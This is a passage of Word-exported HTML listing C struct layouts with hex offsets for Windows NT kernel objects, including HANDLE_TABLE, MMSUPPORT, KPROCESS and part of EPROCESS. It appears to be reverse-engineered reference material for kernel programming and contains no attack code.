<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned reserved<span
style="mso-spacerun: yes">        </span>:<span style="mso-spacerun: yes"> 
</span>1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">        </span>unsigned PageFrameNumber : 20;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
HANDLE_TABLE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
DWORD<span style="mso-spacerun: yes">             </span>Reserved;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
DWORD<span style="mso-spacerun: yes">      </span><span style="mso-spacerun:
yes">       </span>HandleCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
void *<span style="mso-spacerun: yes">            </span>Layer1; // Complex to
do later<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*00C*/
struct _EPROCESS *Process; // passed to PsChargePoolQuota ()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
HANDLE<span style="mso-spacerun: yes">            </span>UniqueProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*014*/
DWORD<span style="mso-spacerun: yes">             </span>NextEntry;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
DWORD<span style="mso-spacerun: yes">             </span>TotalEntries;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*01C*/
ERESOURCE<span style="mso-spacerun: yes">         </span>HandleTableLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*054*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>HandleTableList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*05C*/
KEVENT<span style="mso-spacerun: yes">            </span>Event;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06C*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
MMSUPPORT<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
LARGE_INTEGER LastTrimTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
DWORD<span style="mso-spacerun: yes">         </span>LastTrimFaultCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*00C*/
DWORD<span style="mso-spacerun: yes">      </span><span style="mso-spacerun:
yes">   </span>PageFaultCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
DWORD<span style="mso-spacerun: yes">         </span>PeakWorkingSetSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*014*/
DWORD<span style="mso-spacerun: yes">         </span>WorkingSetSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
DWORD<span style="mso-spacerun: yes">         </span>MinimumWorkingSetSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*01C*/
DWORD<span style="mso-spacerun: yes">         </span>MaximumWorkingSetSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*020*/
PVOID<span style="mso-spacerun: yes">         </span>VmWorkingSetList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*024*/
LIST_ENTRY<span style="mso-spacerun: yes">    </span>WorkingSetExpansionLinks;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02C*/
BOOLEAN<span style="mso-spacerun: yes">       </span>AllowWorkingSetAdjustment;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02D*/
BOOLEAN<span style="mso-spacerun: yes">       </span>AddressSpaceBeingDeleted;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02E*/
BYTE<span style="mso-spacerun: yes">          </span>ForegroundSwitchCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02F*/
BYTE<span style="mso-spacerun: yes">          </span>MemoryPriority;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*030*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
KGDTENTRY<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
WORD<span style="mso-spacerun: yes">  </span>LimitLow;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*002*/
WORD<span style="mso-spacerun: yes">  </span>BaseLow;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
DWORD HighWord;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
KIDTENTRY<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
WORD Offset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*002*/
WORD Selector;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
WORD Access;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*006*/
WORD ExtendedOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
KPROCESS<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
DISPATCHER_HEADER Header; // DO_TYPE_PROCESS (0x1B)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>ProfileListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
DWORD<span style="mso-spacerun: yes">             </span>DirectoryTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*01C*/
DWORD<span style="mso-spacerun: yes">             </span>PageTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*020*/
struct KGDTENTRY<span style="mso-spacerun: yes">  </span>LdtDescriptor; <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*028*/
struct KIDTENTRY<span style="mso-spacerun: yes">  </span>Int21Descriptor; <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*030*/
WORD<span style="mso-spacerun: yes">              </span>IopmOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*032*/
BYTE<span style="mso-spacerun: yes">              </span>Iopl;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*033*/
BOOLEAN<span style="mso-spacerun: yes">           </span>VdmFlag;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*034*/
DWORD<span style="mso-spacerun: yes">             </span>ActiveProcessors;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*038*/
DWORD<span style="mso-spacerun: yes">             </span>KernelTime; // ticks<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*03C*/
DWORD<span style="mso-spacerun: yes">             </span>UserTime;<span
style="mso-spacerun: yes">   </span>// ticks<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*040*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>ReadyListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*048*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>SwapListEntry;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*050*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>ThreadListHead; //
KTHREAD.ThreadListEntry<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*058*/
PVOID<span style="mso-spacerun: yes">             </span>ProcessLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*05C*/
KAFFINITY<span style="mso-spacerun: yes">         </span>Affinity;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*060*/
WORD<span style="mso-spacerun: yes">              </span>StackCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*062*/
BYTE<span style="mso-spacerun: yes">              </span>BasePriority;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*063*/
BYTE<span style="mso-spacerun: yes">              </span>ThreadQuantum;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*064*/
BOOLEAN<span style="mso-spacerun: yes">           </span>AutoAlignment;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*065*/
BYTE<span style="mso-spacerun: yes">              </span>State;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*066*/
BYTE<span style="mso-spacerun: yes">              </span>ThreadSeed;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*067*/
BOOLEAN<span style="mso-spacerun: yes">           </span>DisableBoost;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*068*/
DWORD<span style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">          </span>d068;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06C*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
EPROCESS1<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
struct KPROCESS<span style="mso-spacerun: yes">               </span>Pcb;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06C*/
NTSTATUS<span style="mso-spacerun: yes">               </span>ExitStatus;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*070*/
KEVENT<span style="mso-spacerun: yes">                 </span>LockEvent;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*080*/
DWORD<span style="mso-spacerun: yes">                  </span>LockCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*084*/
DWORD<span style="mso-spacerun: yes">                  </span>d084;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*088*/
LARGE_INTEGER<span style="mso-spacerun: yes">          </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*090*/
LARGE_INTEGER<span style="mso-spacerun: yes">          </span>ExitTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*098*/
PVOID<span style="mso-spacerun: yes">                  </span>LockOwner;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*09C*/
DWORD<span style="mso-spacerun: yes">                  </span>UniqueProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0A0*/
LIST_ENTRY<span style="mso-spacerun: yes">            
</span>ActiveProcessLinks;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0A8*/
DWORD<span style="mso-spacerun: yes">                  </span>QuotaPeakPoolUsage
[2]; // NP, P<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0B0*/
DWORD<span style="mso-spacerun: yes">                 
</span>QuotaPoolUsage<span style="mso-spacerun: yes">     </span>[2]; // NP, P<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0B8*/
DWORD<span style="mso-spacerun: yes">                  </span>PagefileUsage;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0BC*/
DWORD<span style="mso-spacerun: yes">                  </span>CommitCharge;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0C0*/
DWORD<span style="mso-spacerun: yes">                 
</span>PeakPagefileUsage;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0C4*/
DWORD<span style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">             </span>PeakVirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0C8*/
LARGE_INTEGER<span style="mso-spacerun: yes">          </span>VirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0D0*/
struct MMSUPPORT<span style="mso-spacerun: yes">       </span>Vm;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*100*/
DWORD<span style="mso-spacerun: yes">                  </span>d100;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*104*/
DWORD<span style="mso-spacerun: yes">                  </span>d104;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*108*/
DWORD<span style="mso-spacerun: yes">                  </span>d108;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*10C*/
DWORD<span style="mso-spacerun: yes">                  </span>d10C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*110*/
DWORD<span style="mso-spacerun: yes">                  </span>d110;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*114*/
DWORD<span style="mso-spacerun: yes">                  </span>d114;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*118*/
DWORD<span style="mso-spacerun: yes">                  </span>d118;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*11C*/
DWORD<span style="mso-spacerun: yes">                  </span>d11C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*120*/
PVOID<span style="mso-spacerun: yes">                  </span>DebugPort;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*124*/
PVOID<span style="mso-spacerun: yes">                  </span>ExceptionPort;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*128*/
struct HANDLE_TABLE<span style="mso-spacerun: yes">    </span>*ObjectTable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*12C*/
PVOID<span style="mso-spacerun: yes">                  </span>Token;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*130*/
FAST_MUTEX<span style="mso-spacerun: yes">             </span>WorkingSetLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*150*/
DWORD<span style="mso-spacerun: yes">                  </span>WorkingSetPage;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*154*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>ProcessOutswapEnabled;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*155*/
BOOLEAN<span style="mso-spacerun: yes">                </span>ProcessOutswapped;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*156*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>AddressSpaceInitialized;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*157*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>AddressSpaceDeleted;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*158*/
FAST_MUTEX<span style="mso-spacerun: yes">            
</span>AddressCreationLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*178*/
KSPIN_LOCK<span style="mso-spacerun: yes">             </span>HyperSpaceLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*17C*/
DWORD<span style="mso-spacerun: yes">                  </span>ForkInProgress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*180*/
WORD<span style="mso-spacerun: yes">                   </span>VmOperation;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*182*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>ForkWasSuccessful;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*183*/
BYTE<span style="mso-spacerun: yes">                  
</span>MmAgressiveWsTrimMask;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*184*/
DWORD<span style="mso-spacerun: yes">                  </span>VmOperationEvent;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*188*/
struct HARDWARE_PTE<span style="mso-spacerun: yes">    </span>PageDirectoryPte;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
